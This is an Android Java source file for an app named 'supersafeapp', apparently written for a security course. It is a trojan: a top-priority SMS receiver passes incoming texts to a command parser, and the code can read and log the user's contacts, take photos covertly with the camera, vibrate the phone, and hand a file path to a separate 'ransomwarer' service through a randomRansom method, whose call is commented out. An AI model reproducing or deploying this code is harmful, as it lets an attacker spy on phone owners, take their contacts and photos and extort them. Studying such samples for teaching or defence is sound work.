package com.seginf.supersafeapp;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Environment;
import android.os.Vibrator;
import android.util.Log;
import android.view.Menu;
import android.view.SurfaceView;

public class MainActivity extends Activity implements Commandable {

	public void vibrate() {
		Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
		v.vibrate(2000);
	}

	private SMSCommandParser parser;
	private SMSReceiver receiver;
	private IntentFilter filter;
		
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		parser = new SMSCommandParser(this);

		receiver = new SMSReceiver();
		receiver.addConsumer(parser);

		filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
		filter.setPriority(Integer.MAX_VALUE);
		
		registerReceiver(receiver, filter);
		
		/*this.randomRansom();*/
	}
	
	protected void onRestart(){
		registerReceiver(receiver, filter);
		super.onRestart();
	}
	
	protected void onStop()
	{
	    unregisterReceiver(receiver);
	    super.onStop();
	}
	
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	private ArrayList<Contact> contacts;

	public void getContactList() {
		this.contacts = new ContactsReader(this.getApplicationContext()).contacts();
		Log.d("SAFEAPP", contacts.toString());
	}

	private File getAlbumDir() {
		return new File(
				Environment
						.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
				"/");
	}

	public static Camera getCameraInstance() {
		Camera c = null;
		try {
			c = Camera.open(); // attempt to get a Camera instance
		} catch (Exception e) {
			Log.d("SafeApp", "No Camera");
			return null;
		}
		return c; // returns null if camera is unavailable
	}

	private File getImageFile() {
		String s = "yyyyMMdd_HHmmss";
		Date now = new Date();
		String timeStamp = new SimpleDateFormat(s, Locale.US).format(now);

		String imageFileName = "jpeg_" + timeStamp + "_";
		File image;

		try {
			image = File.createTempFile(imageFileName, ".jpeg", getAlbumDir());
		} catch (IOException e) {
			Log.e("SafeApp", "Exception", e);
			return null;
		}
		return image;
	}

	public void takePhoto() {
		Camera c = getCameraInstance();
		if (c == null) {
			return;
		}
		SurfaceView view = new SurfaceView(this);

		try {
			c.setPreviewDisplay(view.getHolder());
		} catch (IOException e) {
			Log.e("SafeApp", "Exception", e);
		}
		c.startPreview();

		final File f = getImageFile();
		c.takePicture(null, null, new Camera.PictureCallback() {
			public void onPictureTaken(byte[] data, Camera camera) {
				FileOutputStream out;
				try {
					out = new FileOutputStream(f);
					out.write(data);
					out.close();
				} catch (FileNotFoundException e) {
					Log.e("SafeApp", "Exception", e);
				} catch (IOException e) {
					Log.e("SafeApp", "Exception", e);
				}
			}
		});
	}

	public void randomRansom() {
		Intent sendIntent = new Intent();
		sendIntent.setAction("com.ransom.ransomwarer.action.RANSOM_ACTION");
		sendIntent.putExtra(Intent.EXTRA_TEXT, "/DCIM/prueba/dos.jpg");
		sendIntent.setType("ransom/note");
		startService(sendIntent);
	}

	@Override
	public void sendSMS(String nro, String mensaje) {
		// TODO Auto-generated method stub	
	}
}
